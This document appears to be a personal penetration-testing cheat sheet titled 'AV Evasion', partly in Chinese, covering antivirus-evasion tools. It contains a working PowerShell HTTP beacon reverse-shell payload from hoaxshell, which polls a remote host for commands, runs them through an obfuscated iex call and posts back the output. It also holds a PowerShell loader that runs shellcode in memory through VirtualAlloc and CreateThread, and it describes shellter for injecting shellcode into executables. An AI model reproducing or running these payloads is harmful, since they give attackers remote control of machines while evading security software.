# AV Evasion

## shellter

shellter是一个动态的反向TCP/UDP连接的shellcode注入工具，它可以将shellcode注入到Windows可执行文件中，使其免杀。

但是要windows环境，还要intel x86/x64架构芯片。所以M1芯片的Mac是不行的。

## hoaxshell

<https://github.com/t3l3machus/hoaxshell>

A Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.

```bash
python3 ./hoaxshell.py -s 192.168.45.185 -r -H "Authorization"
```

```powershell
$s='172.16.8.130:8080';$i='bf987f35-a12cc336-7e35106c';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/bf987f35 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/a12cc336 -Headers @{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=i'e'x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -UseBasicParsing -Uri $p$s/7e35106c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

## powershell

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);   
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
//导入 kernel32.dll 中的 VirtualAlloc、CreateThread  
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
// 导入 msvcrt.dll 中的 memset
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;                         // 变量 $sc 保存 shellcode
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);                  //使用VirtualAlloc分配一块内存
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};    //使用 memset 函数将 shellcode 写入新分配的内存中
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };           //使用 CreateThread 创建新的进程，执行内存中的 shellcode
```
